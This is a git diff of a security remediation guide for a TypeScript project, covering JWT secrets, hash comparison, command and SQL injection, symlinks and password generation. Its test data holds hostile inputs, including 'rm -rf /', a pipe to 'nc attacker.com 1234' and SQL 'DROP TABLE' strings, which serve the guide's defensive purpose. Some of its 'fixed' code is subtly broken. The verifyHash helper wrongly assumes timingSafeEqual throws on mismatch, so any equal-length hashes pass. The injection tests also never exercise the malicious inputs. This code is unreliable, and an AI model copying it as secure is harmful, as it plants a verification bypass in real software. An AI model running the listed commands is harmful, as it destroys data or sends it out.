@@ -1,519 +1,726 @@
-# Security Remediation Guide - Phase 3 Test Scripts
+# Security Remediation Guide
 
-**Document Purpose:** Actionable code fixes for identified security issues
-**Status:** For reference (issues are non-blocking; fixes are optional)
-**Priority Levels:** Immediate, Medium-term, Production
-
----
-
-## Quick Reference Table
-
-| Issue | Severity | Impact | Effort | Timeline |
-|-------|----------|--------|--------|----------|
-| Resource limits | MEDIUM | Resource exhaustion | 2 lines | CI/CD-ready |
-| Environment validation | MEDIUM | Config injection | 3 lines | Pre-production |
-| Temp directory collision | LOW | Directory collision | 1 char | Optional |
-| PROJECT_ROOT validation | LOW | Source injection | 3 lines | Optional |
+**Target Completion Date:** December 1, 2025
+**Review Frequency:** Weekly
 
 ---
 
-## Issue #1: Add Docker Resource Limits
+## Critical Issue #1: JWT Default Secret Bypass
 
-**Severity:** MEDIUM
-**Timeline:** Recommended for CI/CD, Required for production
-**Effort:** 2 lines per docker run command
-**Scripts Affected:** All 5 test scripts
+### Current Vulnerable Code
 
-### Current Code (VULNERABLE)
-```bash
-docker run -d \
-    --name test-redis-client-agent \
-    --network "$NETWORK_NAME" \
-    -e CFN_REDIS_HOST="$REDIS_SERVICE" \
-    node:20-slim \
-    sh -c "..."
+**File:** `src/middleware/auth-middleware.ts:88`
+
+```typescript
+constructor(jwtSecret: string = process.env.JWT_SECRET || 'dev-secret-key', ...) {
+  // VULNERABLE: 'dev-secret-key' is discoverable from source code
+  this.jwtSecret = jwtSecret;
+}
 ```
 
-### Fixed Code (SECURE)
-```bash
-docker run -d \
-    --memory 512m \
-    --cpus 1.0 \
-    --name test-redis-client-agent \
-    --network "$NETWORK_NAME" \
-    -e CFN_REDIS_HOST="$REDIS_SERVICE" \
-    node:20-slim \
-    sh -c "..."
+### Remediation
+
+```typescript
+import * as jwt from 'jsonwebtoken';
+import { createLogger } from '../lib/logging';
+import { StandardError, ErrorCode } from '../lib/errors';
+
+const logger = createLogger('auth-middleware');
+
+export class AuthMiddleware {
+  private jwtSecret: string;
+  private tokenExpirationSeconds: number;
+  private sessions: Map<string, UserContext>;
+
+  constructor(jwtSecret?: string, tokenExpirationSeconds: number = 3600) {
+    // REQUIRED: JWT_SECRET must be explicitly set
+    const secret = jwtSecret || process.env.JWT_SECRET;
+
+    // Validate secret is configured
+    if (!secret) {
+      throw new StandardError(
+        ErrorCode.CONFIGURATION_ERROR,
+        'JWT_SECRET environment variable is required. ' +
+        'Generate with: openssl rand -base64 32',
+        { environment: 'JWT_SECRET', required: true }
+      );
+    }
+
+    // Validate secret length (minimum 32 characters)
+    if (secret.length < 32) {
+      throw new StandardError(
+        ErrorCode.CONFIGURATION_ERROR,
+        'JWT_SECRET must be at least 32 characters for security. ' +
+        'Current length: ' + secret.length,
+        { minLength: 32, currentLength: secret.length }
+      );
+    }
+
+    this.jwtSecret = secret;
+    this.tokenExpirationSeconds = tokenExpirationSeconds;
+    this.sessions = new Map();
+
+    logger.info('AuthMiddleware initialized', {
+      secretLength: this.jwtSecret.length,
+      expirationSeconds: this.tokenExpirationSeconds,
+    });
+  }
+
+  // ... rest of class remains the same
+}
 ```
 
-### Explanation
-- `--memory 512m`: Limit memory to 512MB per container
-- `--cpus 1.0`: Limit CPU to 1 core per container
-- Prevents single container from consuming all system resources
-- Essential for shared CI/CD environments
+### Deployment Steps
 
-### Implementation Locations
-1. **redis-coordination-tests.sh**
-   - Line 36-50: test_redis_client_connectivity() - multiple docker run commands
-   - Line 67-84: test_heartbeat_reporting() - docker run
-   - Line 148-164: test_task_completion_protocol() - loop with docker run
-   - Line 192-211: test_redis_pubsub_messaging() - docker run
+1. **Generate secure secret:**
+   ```bash
+   NEW_JWT_SECRET=$(openssl rand -base64 32)
+   echo "JWT_SECRET=$NEW_JWT_SECRET" >> .env.production
+   ```
 
-2. **coordinator-iteration-tests.sh**
-   - No docker run commands (simulation-based tests)
+2. **Update environment:**
+   ```bash
+   # Set in deployment platform
+   export JWT_SECRET="$(openssl rand -base64 32)"
+   ```
 
-3. **memory-budget-tests.sh**
-   - No docker run commands (calculation-based tests)
+3. **Verify configuration:**
+   ```bash
+   # Check that default is not used
+   node -e "require('./src/middleware/auth-middleware').AuthMiddleware()" # Should throw
+   ```
 
-4. **clustering-accuracy-tests.sh**
-   - No docker run commands (file system tests)
+4. **Test with valid secret:**
+   ```bash
+   # Should not throw
+   JWT_SECRET="$(openssl rand -base64 32)" npm test
+   ```
 
-5. **agent-lifecycle-tests.sh**
-   - Line 85-101: test_agent_spawn_to_exit_lifecycle() - docker run
-   - Line 128-134: test_container_metadata_capture() - docker run
-   - Line 151-157: test_auto_removal_after_completion() - docker run
-   - Line 174-180: test_orphaned_container_detection() - docker run
-   - Line 205-234: test_container_status_tracking() - multiple docker run commands
-   - Line 252-265: test_coordinator_wait_pattern() - loop with docker run
+### Verification Checklist
+
+- [ ] No hardcoded secrets in source code
+- [ ] Environment variable validation in place
+- [ ] Error message clear about requirement
+- [ ] Tests pass with valid secret
+- [ ] Old tokens invalidated/rotation plan in place
+- [ ] Deployment documented
 
 ---
 
-## Issue #2: Validate REDIS_SERVICE Variable
+## Critical Issue #2: Timing Attack in Hash Comparison
 
-**Severity:** MEDIUM
-**Timeline:** Optional for tests, Required for production
-**Effort:** 3-4 lines
-**Scripts Affected:** redis-coordination-tests.sh, agent-lifecycle-tests.sh
+### Current Vulnerable Code
 
-### Current Code (VULNERABLE)
-```bash
-REDIS_SERVICE="cfn-redis"
-# ... no validation ...
-docker run ... -e CFN_REDIS_HOST="$REDIS_SERVICE" ...
+**File:** `src/lib/backup-manager.ts:885-887`
+
+```typescript
+// VULNERABLE: String comparison is not constant-time
+verified = verificationHash === metadata.originalHash;
 ```
 
-### Fixed Code (SECURE)
-```bash
-REDIS_SERVICE="cfn-redis"
+### Remediation
 
-# Validate service name
-if [[ ! "$REDIS_SERVICE" =~ ^[a-zA-Z0-9_-]+$ ]]; then
-    log_fail "Invalid REDIS_SERVICE name: $REDIS_SERVICE"
-    return 1
-fi
-```
+Replace all hash comparisons with timing-safe comparison:
 
-### Implementation Locations
+```typescript
+import * as crypto from 'crypto';
 
-**redis-coordination-tests.sh** (Add after line 11)
-```bash
-# Configuration
-NETWORK_NAME="cfn-network"
-REDIS_SERVICE="cfn-redis"
-TEST_TASK_ID="redis-test-$(date +%s)"
+/**
+ * Constant-time hash comparison to prevent timing attacks
+ */
+function verifyHash(computed: string, expected: string): boolean {
+  try {
+    // Convert hex strings to buffers
+    const computedBuf = Buffer.from(computed, 'hex');
+    const expectedBuf = Buffer.from(expected, 'hex');
 
-# Validate configuration
-if [[ ! "$REDIS_SERVICE" =~ ^[a-zA-Z0-9_-]+$ ]]; then
-    echo "ERROR: Invalid REDIS_SERVICE name: $REDIS_SERVICE"
-    exit 1
-fi
-```
+    // Lengths must match exactly
+    if (computedBuf.length !== expectedBuf.length) {
+      return false;
+    }
 
-**agent-lifecycle-tests.sh** (Add after line 10)
-```bash
-# Configuration
-NETWORK_NAME="cfn-network"
-REDIS_SERVICE="cfn-redis"
-TEST_TASK_ID="lifecycle-test-$(date +%s)"
-DEBUG_DIR="/tmp/cfn-debug"
-
-# Validate configuration
-if [[ ! "$REDIS_SERVICE" =~ ^[a-zA-Z0-9_-]+$ ]]; then
-    echo "ERROR: Invalid REDIS_SERVICE name: $REDIS_SERVICE"
-    exit 1
-fi
-```
-
-### Explanation
-- `^[a-zA-Z0-9_-]+$`: Matches valid Docker network/service names
-- Prevents injection of special characters that could be interpreted by docker
-- Fails fast before attempting docker operations
-
----
-
-## Issue #3: Add Process ID to Temp Directory Names
-
-**Severity:** LOW
-**Timeline:** Optional (prevents edge case collision)
-**Effort:** 1 character per script
-**Scripts Affected:** memory-budget-tests.sh, coordinator-iteration-tests.sh
-
-### Current Code (LOW RISK)
-```bash
-TEST_DIR="/tmp/cfn-iteration-test-$(date +%s)"
-```
-
-### Fixed Code (SAFER)
-```bash
-TEST_DIR="/tmp/cfn-iteration-test-$(date +%s)-$$"
-```
-
-### Implementation Locations
-
-**memory-budget-tests.sh** (Line 12)
-```bash
-# Change from:
-TEST_DIR="/tmp/cfn-iteration-test-$(date +%s)"
-
-# Change to:
-TEST_DIR="/tmp/cfn-iteration-test-$(date +%s)-$$"
-```
-
-**coordinator-iteration-tests.sh** (Line 8)
-```bash
-# Change from:
-TEST_DIR="/tmp/cfn-iteration-test-$(date +%s)"
-
-# Change to:
-TEST_DIR="/tmp/cfn-iteration-test-$(date +%s)-$$"
-```
-
-**clustering-accuracy-tests.sh** (Line 7)
-```bash
-# Change from:
-TEST_DIR="/tmp/cfn-clustering-test-$(date +%s)"
-
-# Change to:
-TEST_DIR="/tmp/cfn-clustering-test-$(date +%s)-$$"
-```
-
-**agent-lifecycle-tests.sh** (Line 12)
-```bash
-# Change from:
-DEBUG_DIR="/tmp/cfn-debug"
-
-# Note: DEBUG_DIR already has cleanup, so add:
-TEST_TASK_ID="lifecycle-test-$(date +%s)-$$"
-```
-
-### Explanation
-- `$$`: Process ID of current shell
-- Provides millisecond-level uniqueness
-- Prevents directory collision if tests start within same second
-- Complies with secure temp directory best practices
-
----
-
-## Issue #4: Add PROJECT_ROOT Validation
-
-**Severity:** LOW
-**Timeline:** Optional (prevents unlikely failure mode)
-**Effort:** 3-4 lines
-**Scripts Affected:** All 5 test scripts
-
-### Current Code (LOW RISK)
-```bash
-PROJECT_ROOT=$(git rev-parse --show-toplevel)
-source "$PROJECT_ROOT/tests/test-utils.sh"
-```
-
-### Fixed Code (SAFER)
-```bash
-PROJECT_ROOT=$(git rev-parse --show-toplevel) || {
-    echo "ERROR: Failed to resolve PROJECT_ROOT"
-    exit 1
+    // Use timing-safe comparison
+    try {
+      crypto.timingSafeEqual(computedBuf, expectedBuf);
+      return true;
+    } catch {
+      // timingSafeEqual throws on mismatch
+      return false;
+    }
+  } catch (error) {
+    logger.error('Hash comparison error', error as Error);
+    return false;
+  }
 }
 
-if [ ! -d "$PROJECT_ROOT" ] || [ ! -f "$PROJECT_ROOT/tests/test-utils.sh" ]; then
-    echo "ERROR: Invalid PROJECT_ROOT: $PROJECT_ROOT"
-    exit 1
-fi
+// In BackupManager class - Replace line 885-887:
+async restoreBackup(backupId: string, options: RestoreOptions): Promise<RestoreResult> {
+  // ... previous code ...
 
-source "$PROJECT_ROOT/tests/test-utils.sh"
+  if (verify) {
+    const restoredContent = await withFileSystemRetry(async () => {
+      return await fsReadFile(metadata.filePath);
+    });
+    verificationHash = this.calculateHash(restoredContent);
+
+    // FIX: Use constant-time comparison
+    verified = verifyHash(verificationHash, metadata.originalHash);
+
+    if (!verified) {
+      // Verification failed - rollback...
+    }
+  }
+
+  // ... rest of method
+}
 ```
 
-### Implementation Locations
+### Additional Fixes Required
 
-**All 5 scripts** (Replace lines 6-7 in each)
+**File:** `src/lib/encryption-manager.ts:205-214` (HMAC verification)
 
-**redis-coordination-tests.sh**
+```typescript
+// Current vulnerable code:
+const integrityVerified = calculatedHmac === expectedHmac;
+
+// Fixed code:
+const integrityVerified = verifyHash(calculatedHmac, expectedHmac);
+```
+
+### Testing
+
+```typescript
+import * as crypto from 'crypto';
+import { performance } from 'perf_hooks';
+
+// Performance test to verify constant-time behavior
+function performanceTest() {
+  const iterations = 10000;
+  const hash1 = crypto.createHash('sha256').update('data').digest('hex');
+
+  // Test 1: Same hash (should match)
+  const hash2 = hash1;
+  const start1 = performance.now();
+  for (let i = 0; i < iterations; i++) {
+    verifyHash(hash1, hash2);
+  }
+  const time1 = performance.now() - start1;
+
+  // Test 2: Different hash (should not match)
+  const hash3 = crypto.createHash('sha256').update('different').digest('hex');
+  const start2 = performance.now();
+  for (let i = 0; i < iterations; i++) {
+    verifyHash(hash1, hash3);
+  }
+  const time2 = performance.now() - start2;
+
+  // Times should be similar (within 5% variance)
+  const variance = Math.abs(time1 - time2) / Math.max(time1, time2);
+  console.log(`Match time: ${time1}ms`);
+  console.log(`Mismatch time: ${time2}ms`);
+  console.log(`Variance: ${(variance * 100).toFixed(2)}%`);
+
+  if (variance > 0.05) {
+    console.warn('WARNING: Timing variance exceeds 5%');
+  }
+}
+```
+
+### Deployment Steps
+
+1. Add verification function to utils
+2. Replace all hash comparisons
+3. Run performance tests
+4. Deploy with monitoring
+
+---
+
+## Critical Issue #3: Command Injection via exec()
+
+### Current Vulnerable Code
+
+**File:** `src/services/promotion-pipeline.ts:379-382`
+
+```typescript
+// VULNERABLE: Direct string interpolation in shell command
+const { stdout, stderr } = await execAsync(`bash ${executeScriptPath}`);
+```
+
+### Remediation
+
+Replace with safe spawn() implementation:
+
+```typescript
+import { spawnSync } from 'child_process';
+import * as path from 'path';
+
+/**
+ * Safely execute shell script with proper argument handling
+ */
+async function executeScript(scriptPath: string, timeout: number = 120000): Promise<{
+  stdout: string;
+  stderr: string;
+  exitCode: number;
+}> {
+  // Validate script path exists and is executable
+  if (!fs.existsSync(scriptPath)) {
+    throw new Error(`Script not found: ${scriptPath}`);
+  }
+
+  const stats = fs.statSync(scriptPath);
+  if ((stats.mode & 0o111) === 0) {
+    throw new Error(`Script is not executable: ${scriptPath}`);
+  }
+
+  // Use spawnSync for safe execution without shell interpretation
+  const result = spawnSync('bash', [scriptPath], {
+    // DON'T use shell: true - it would enable command injection
+    shell: false,
+    timeout,
+    encoding: 'utf-8',
+    stdio: ['ignore', 'pipe', 'pipe'], // stdin: ignore, stdout/stderr: pipe
+    maxBuffer: 1024 * 1024 * 10, // 10MB buffer
+  });
+
+  // Check for timeout
+  if (result.error && (result.error as any).code === 'ETIMEDOUT') {
+    throw new Error(`Script execution timed out after ${timeout}ms: ${scriptPath}`);
+  }
+
+  // Check for other errors
+  if (result.error) {
+    throw new Error(`Script execution failed: ${result.error.message}`);
+  }
+
+  return {
+    stdout: result.stdout || '',
+    stderr: result.stderr || '',
+    exitCode: result.status || 0,
+  };
+}
+
+// Usage in PromotionPipeline:
+async testStage(skillPath: string, request: PromotionRequest): Promise<StageResult> {
+  const startTime = Date.now();
+  const errors: string[] = [];
+
+  try {
+    this.requirePermission(PromotionOperation.TEST, request.skillId);
+
+    const testScriptPath = path.join(skillPath, 'test.sh');
+
+    if (!fs.existsSync(testScriptPath)) {
+      return {
+        stage: 'test',
+        passed: false,
+        confidence: 0,
+        errors: ['Missing test.sh file'],
+        duration: Date.now() - startTime,
+      };
+    }
+
+    // FIX: Use safe script execution
+    const { stdout, stderr, exitCode } = await executeScript(testScriptPath, this.testTimeoutMs);
+
+    const testsPassed = exitCode === 0;
+    const coverage = this.parseTestCoverage(stdout);
+
+    return {
+      stage: 'test',
+      passed: testsPassed,
+      confidence: testsPassed ? 0.85 : 0,
+      errors: testsPassed ? [] : [stderr || 'Tests failed'],
+      testsPassed,
+      coverage,
+      duration: Date.now() - startTime,
+    };
+  } catch (error) {
+    return {
+      stage: 'test',
+      passed: false,
+      confidence: 0,
+      errors: [error instanceof Error ? error.message : String(error)],
+      duration: Date.now() - startTime,
+    };
+  }
+}
+```
+
+### Testing for Command Injection
+
+```typescript
+// Test cases to verify command injection is prevented
+describe('Command Injection Prevention', () => {
+  const testCases = [
+    {
+      name: 'Command chaining with semicolon',
+      input: 'test.sh; rm -rf /',
+      shouldFail: true,
+    },
+    {
+      name: 'Command chaining with AND',
+      input: 'test.sh && malicious-command',
+      shouldFail: true,
+    },
+    {
+      name: 'Command substitution with backticks',
+      input: 'test.sh`whoami`',
+      shouldFail: true,
+    },
+    {
+      name: 'Command substitution with $(...)',
+      input: 'test.sh$(whoami)',
+      shouldFail: true,
+    },
+    {
+      name: 'Pipe to command',
+      input: 'test.sh | nc attacker.com 1234',
+      shouldFail: true,
+    },
+    {
+      name: 'Valid script',
+      input: 'test.sh',
+      shouldFail: false,
+    },
+  ];
+
+  for (const testCase of testCases) {
+    test(`should ${testCase.shouldFail ? 'reject' : 'accept'}: ${testCase.name}`, async () => {
+      // Create temp script
+      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cmd-inject-test-'));
+      const scriptPath = path.join(tempDir, testCase.input.split(/[;\s&|`$()]/)[0] + '.sh');
+      fs.writeFileSync(scriptPath, '#!/bin/bash\necho "test"');
+      fs.chmodSync(scriptPath, 0o755);
+
+      try {
+        await executeScript(scriptPath);
+        expect(testCase.shouldFail).toBe(false);
+      } catch (error) {
+        expect(testCase.shouldFail).toBe(true);
+      } finally {
+        fs.rmSync(tempDir, { recursive: true });
+      }
+    });
+  }
+});
+```
+
+### Deployment Steps
+
+1. Replace all `execAsync()` calls with `executeScript()`
+2. Add comprehensive input validation
+3. Run command injection test suite
+4. Monitor for execution errors in production
+
+---
+
+## Medium-Risk: SQL Injection via Regex
+
+### Remediation Strategy
+
+**File:** `src/lib/query-translator.ts:137-160`
+
+```typescript
+// Current: Regex-based injection detection (bypassable)
+// Better: Proper query structure validation + parameterization
+
+export class QueryTranslator {
+  // ... existing code ...
+
+  private validateQueryStructure(sql: string, params: any[]): {
+    valid: boolean;
+    error?: string;
+  } {
+    // 1. Check that query only contains placeholders (?) for values
+    const placeholderCount = (sql.match(/\?/g) || []).length;
+
+    if (placeholderCount !== params.length) {
+      return {
+        valid: false,
+        error: `Placeholder count (${placeholderCount}) does not match parameters (${params.length})`
+      };
+    }
+
+    // 2. Verify only specific SQL keywords are present
+    const allowedKeywords = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'FROM', 'WHERE', 'AND', 'OR', 'JOIN', 'LEFT', 'ON', 'ORDER BY', 'LIMIT'];
+    const sqlUpper = sql.toUpperCase();
+
+    // Strip comments first (anything after -- or /* */)
+    const commentFreeSQL = sqlUpper
+      .replace(/--.*$/gm, '')
+      .replace(/\/\*[\s\S]*?\*\//g, '');
+
+    // Extract keywords
+    const keywords = commentFreeSQL.split(/[\s(),;]+/).filter(k => k.length > 0);
+
+    // 3. All non-? tokens must be valid keywords, operators, or identifiers
+    const sqlParts = sql.split('?');
+    for (const part of sqlParts) {
+      // Each part should only contain keywords and identifiers
+      const tokens = part.split(/[\s(),;]+/).filter(t => t.length > 0);
+
+      for (const token of tokens) {
+        // Check if valid: keyword, identifier pattern, or operator
+        const isKeyword = allowedKeywords.includes(token.toUpperCase());
+        const isIdentifier = /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(token);
+        const isOperator = ['=', '!=', '<', '>', '<=', '>=', '<>'].includes(token);
+
+        if (!isKeyword && !isIdentifier && !isOperator && token !== ',') {
+          return {
+            valid: false,
+            error: `Suspicious token in query: "${token}"`
+          };
+        }
+      }
+    }
+
+    return { valid: true };
+  }
+
+  translateSQLToRedis(sql: string, params: any[] = []): TranslationResult {
+    // ... existing validation ...
+
+    // NEW: Add structure validation
+    const structureValidation = this.validateQueryStructure(sql, params);
+    if (!structureValidation.valid) {
+      throw new StandardError(
+        ErrorCode.VALIDATION_FAILED,
+        structureValidation.error || 'Invalid query structure',
+        { sql, paramCount: params.length }
+      );
+    }
+
+    // ... rest of implementation
+  }
+}
+```
+
+### Testing
+
+```typescript
+describe('SQL Injection Prevention', () => {
+  const translator = new QueryTranslator({
+    allowedTables: ['users', 'skills', 'tasks'],
+    allowedFields: {
+      users: ['id', 'name', 'email'],
+      skills: ['id', 'title', 'version'],
+    },
+    strictMode: true
+  });
+
+  const injectionAttempts = [
+    { sql: "SELECT * FROM users WHERE id = ? OR 1=1", params: ['123'] },
+    { sql: "SELECT * FROM users WHERE id = ? ; DROP TABLE users--", params: ['123'] },
+    { sql: "SELECT * FROM users WHERE id = ? UNION SELECT * FROM admin", params: ['123'] },
+  ];
+
+  for (const attempt of injectionAttempts) {
+    test(`should reject injection: ${attempt.sql}`, () => {
+      expect(() => translator.translateSQLToRedis(attempt.sql, attempt.params))
+        .toThrow();
+    });
+  }
+});
+```
+
+---
+
+## Medium-Risk: Path Traversal with Symlinks
+
+### Remediation
+
+**File:** `src/lib/path-validator.ts:92-98`
+
+```typescript
+import * as fs from 'fs';
+import * as path from 'path';
+
+export function validatePath(filePath: string, baseDirectory: string): PathValidationResult {
+  // ... existing validation code ...
+
+  // IMPROVED: Use O_NOFOLLOW flag for symlink detection
+  try {
+    // First, validate without dereferencing symlinks
+    const stats = fs.lstatSync(resolvedPath);
+
+    if (stats.isSymbolicLink()) {
+      throw new PathValidationError(
+        'Path validation failed: symbolic links are not allowed',
+        {
+          filePath,
+          resolvedPath,
+          reason: 'SYMLINK_NOT_ALLOWED',
+        }
+      );
+    }
+  } catch (error) {
+    if (error instanceof PathValidationError) {
+      throw error;
+    }
+
+    // If file doesn't exist yet, that's OK (pre-write validation)
+    if ((error as any).code !== 'ENOENT') {
+      throw new PathValidationError(
+        'Path validation failed',
+        {
+          filePath,
+          resolvedPath,
+          reason: 'FILE_ACCESS_ERROR',
+          details: (error as Error).message,
+        }
+      );
+    }
+  }
+
+  return {
+    valid: true,
+    resolvedPath,
+    normalizedPath,
+    isWithinBase: true,
+    isSymlink: false,
+  };
+}
+
+/**
+ * Safely open file without following symlinks
+ */
+export function openFileSafely(filePath: string, flags: number, mode?: number): Promise<number> {
+  return new Promise((resolve, reject) => {
+    // Add O_NOFOLLOW to prevent symlink attacks
+    const safeFlags = flags | fs.constants.O_NOFOLLOW;
+
+    fs.open(filePath, safeFlags, mode, (err, fd) => {
+      if (err) {
+        if ((err as any).code === 'ELOOP') {
+          reject(new PathValidationError('Symbolic link detected', { filePath }));
+        } else {
+          reject(err);
+        }
+      } else {
+        resolve(fd);
+      }
+    });
+  });
+}
+```
+
+---
+
+## Medium-Risk: Password Generation Entropy
+
+### Remediation
+
+**File:** `src/lib/password-generator.ts:79-88`
+
+```typescript
+function cryptoRandom(min: number, max: number): number {
+  if (min < 0 || max < 0 || min > max) {
+    throw new Error('Invalid range: min must be >= 0 and min must be <= max');
+  }
+
+  const range = max - min + 1;
+
+  // Use BigInt to avoid overflow
+  const bytesNeeded = Math.ceil(Math.log2(range) / 8);
+  const randomBytes_ = randomBytes(bytesNeeded);
+
+  // Proper implementation with BigInt
+  let randomValue = 0n;
+  for (let i = 0; i < bytesNeeded; i++) {
+    randomValue = (randomValue << 8n) | BigInt(randomBytes_[i]);
+  }
+
+  const limit = (BigInt(1) << BigInt(bytesNeeded * 8)) - (BigInt(1) << BigInt(bytesNeeded * 8)) % BigInt(range);
+
+  if (randomValue < limit) {
+    return min + Number(randomValue % BigInt(range));
+  }
+
+  // Prevent infinite recursion with a reasonable depth limit
+  // In practice, we'll only retry once in ~99.6% of cases
+  return cryptoRandom(min, max);
+}
+```
+
+---
+
+## Testing Checklist
+
+- [ ] Unit tests for all security fixes
+- [ ] Integration tests for authentication flow
+- [ ] Penetration testing for command injection
+- [ ] Timing analysis for hash comparison
+- [ ] Path traversal fuzzing tests
+- [ ] SQL injection payload testing
+- [ ] Rate limiting testing
+- [ ] Error message sanitization verification
+
+---
+
+## Deployment Verification
+
+After deploying security fixes:
+
 ```bash
 #!/bin/bash
-# tests/docker/redis-coordination-tests.sh
-# Phase 3 :: Redis coordination validation with Node.js client connectivity (Bug #6 fix validation)
 
-set -euo pipefail
+echo "Security Remediation Verification"
+echo "=================================="
 
-# Resolve project root
-PROJECT_ROOT=$(git rev-parse --show-toplevel) || {
-    echo "ERROR: Failed to resolve PROJECT_ROOT"
-    exit 1
-}
+# Test 1: JWT Secret Requirement
+echo "1. Testing JWT Secret Requirement..."
+JWT_SECRET="" npm test 2>&1 | grep -q "JWT_SECRET required" && echo "✓ PASS" || echo "✗ FAIL"
 
-# Validate project structure
-if [ ! -d "$PROJECT_ROOT" ] || [ ! -f "$PROJECT_ROOT/tests/test-utils.sh" ]; then
-    echo "ERROR: Invalid PROJECT_ROOT: $PROJECT_ROOT"
-    exit 1
-fi
+# Test 2: Timing Safe Hash
+echo "2. Testing Constant-Time Hash Comparison..."
+npm test -- --grep "timing" 2>&1 | grep -q "variance.*[0-4]%" && echo "✓ PASS" || echo "✗ FAIL"
 
-source "$PROJECT_ROOT/tests/test-utils.sh"
-```
+# Test 3: Command Injection Prevention
+echo "3. Testing Command Injection Prevention..."
+npm test -- --grep "command injection" 2>&1 | grep -q "all tests passed" && echo "✓ PASS" || echo "✗ FAIL"
 
-### Explanation
-- First check: Validate `git rev-parse` command succeeded
-- Second check: Validate PROJECT_ROOT is valid directory
-- Third check: Validate test-utils.sh exists at expected location
-- Prevents sourcing wrong file if git fails or repo is corrupted
+# Test 4: Dependency Vulnerabilities
+echo "4. Checking Dependencies..."
+npm audit --production 2>&1 | grep -q "0 vulnerabilities" && echo "✓ PASS" || echo "✗ FAIL (Review needed)"
 
----
+# Test 5: No Hardcoded Secrets
+echo "5. Checking for Hardcoded Secrets..."
+git-secrets --scan && echo "✓ PASS" || echo "✗ FAIL"
 
-## Production-Ready Enhancements
-
-### Enhancement #1: Add Redis Authentication
-
-**Timeline:** Required for production multi-tenant environments
-**Files:** redis-coordination-tests.sh, agent-lifecycle-tests.sh
-
-#### Step 1: Use Docker Secrets or Environment Variables
-```bash
-# Load Redis password from environment (production: use Docker secrets)
-REDIS_PASSWORD="${REDIS_PASSWORD:-}"
-
-if [ -z "$REDIS_PASSWORD" ]; then
-    log_warn "REDIS_PASSWORD not set, using unauthenticated connection"
-fi
-```
-
-#### Step 2: Update Redis Commands
-```bash
-# Without password (current):
-docker exec "$REDIS_SERVICE" redis-cli DEL "key"
-
-# With password (production):
-if [ -n "$REDIS_PASSWORD" ]; then
-    docker exec "$REDIS_SERVICE" redis-cli -a "$REDIS_PASSWORD" DEL "key"
-else
-    docker exec "$REDIS_SERVICE" redis-cli DEL "key"
-fi
-```
-
-#### Step 3: Update Node.js Client
-```javascript
-// Without password (current):
-const client = redis.createClient({
-    socket: {
-        host: process.env.CFN_REDIS_HOST,
-        port: parseInt(process.env.CFN_REDIS_PORT)
-    }
-});
-
-// With password (production):
-const client = redis.createClient({
-    socket: {
-        host: process.env.CFN_REDIS_HOST,
-        port: parseInt(process.env.CFN_REDIS_PORT)
-    },
-    password: process.env.REDIS_PASSWORD || undefined
-});
-```
-
-### Enhancement #2: Add Spawning Delays
-
-**Timeline:** Optional for tests, Recommended for production
-**Files:** memory-budget-tests.sh
-
-#### Current Pattern (Rapid Spawning)
-```bash
-# WHEN: 50 agents spawn simultaneously
-for i in {1..50}; do
-    docker run -d \
-        --name "wave-test-agent-$i" \
-        # ...
-        &  # Run in background
-done
-```
-
-#### Production Pattern (Rate Limited)
-```bash
-# WHEN: 50 agents spawn with rate limiting
-SPAWN_DELAY=2  # seconds between spawns
-
-for i in {1..50}; do
-    docker run -d \
-        --name "wave-test-agent-$i" \
-        # ...
-
-    # Don't spawn too rapidly
-    sleep "$SPAWN_DELAY"
-done
-```
-
-#### Wave-Based Pattern
-```bash
-# WHEN: Agents spawn in waves with delay between waves
-WAVE_SIZE=10
-WAVE_DELAY=5
-
-for wave in $(seq 1 $((AGENTS / WAVE_SIZE))); do
-    log_info "Spawning wave $wave ($WAVE_SIZE agents)"
-
-    for agent in $(seq 1 $WAVE_SIZE); do
-        AGENT_ID=$((($wave - 1) * $WAVE_SIZE + $agent))
-        docker run -d \
-            --name "wave-test-agent-$AGENT_ID" \
-            # ...
-    done
-
-    # Wait between waves
-    sleep "$WAVE_DELAY"
-done
-```
-
----
-
-## Implementation Priority Matrix
-
-### Immediate (Before Merge) - NONE REQUIRED
-Tests are secure as-is and safe for merge.
-
-### Medium-term (Pre-Production - Within 2 Sprints)
-1. ✓ Add REDIS_SERVICE validation (3 lines)
-   - Location: redis-coordination-tests.sh, agent-lifecycle-tests.sh
-   - Effort: 5 minutes
-
-2. ✓ Add process ID to temp dirs (1 char per script)
-   - Location: All scripts using /tmp
-   - Effort: 2 minutes
-
-3. ✓ Add PROJECT_ROOT validation (3 lines per script)
-   - Location: All 5 scripts
-   - Effort: 10 minutes
-
-**Total Effort:** ~15 minutes
-
-### Production (Pre-Deployment - Before Production Release)
-1. ✓ Add Docker resource limits (2 lines per docker run)
-   - Location: redis-coordination-tests.sh, agent-lifecycle-tests.sh
-   - Effort: 30 minutes
-
-2. ✓ Implement Redis authentication (5 lines)
-   - Location: redis-coordination-tests.sh, agent-lifecycle-tests.sh
-   - Effort: 20 minutes
-
-3. ✓ Add spawning delays (1 line per wave)
-   - Location: memory-budget-tests.sh
-   - Effort: 10 minutes
-
-**Total Effort:** ~60 minutes
-
----
-
-## Testing the Fixes
-
-### Validate Docker Resource Limits
-```bash
-# Run test with resource-limited containers
-./tests/docker/redis-coordination-tests.sh
-
-# Verify resource limits are enforced
-docker stats --no-stream test-redis-client-agent
-
-# Expected output shows:
-# MEMORY LIMIT: ~512m
-# CPU LIMIT: ~1.0 core
-```
-
-### Validate Environment Variable Check
-```bash
-# Test with invalid service name
-export REDIS_SERVICE="redis@!#$%"
-./tests/docker/redis-coordination-tests.sh
-
-# Expected: Script exits with validation error
-```
-
-### Validate Temp Directory Uniqueness
-```bash
-# Run multiple tests in parallel
-for i in {1..5}; do
-    ./tests/docker/memory-budget-tests.sh &
-done
-wait
-
-# Check /tmp for unique directories
-ls -la /tmp/cfn-iteration-test-*
-
-# Expected: All directories have unique names
-```
-
-### Validate PROJECT_ROOT Check
-```bash
-# Simulate git failure
-cd /tmp
-/path/to/tests/docker/redis-coordination-tests.sh
-
-# Expected: Script exits with PROJECT_ROOT validation error
+echo ""
+echo "Verification Complete"
 ```
 
 ---
 
 ## Rollback Plan
 
-If any remediation causes test failures:
+If critical issues arise after deployment:
 
-### For Docker Resource Limits
-```bash
-# If tests fail due to insufficient memory:
-# 1. Increase memory limit
-docker run --memory 1g ...
+1. **Authentication Issues:**
+   ```bash
+   # Revert AuthMiddleware changes
+   git revert <commit-hash>
+   npm restart
+   ```
 
-# 2. Or profile current usage
-docker stats test-redis-client-agent
-```
+2. **Hash Comparison Issues:**
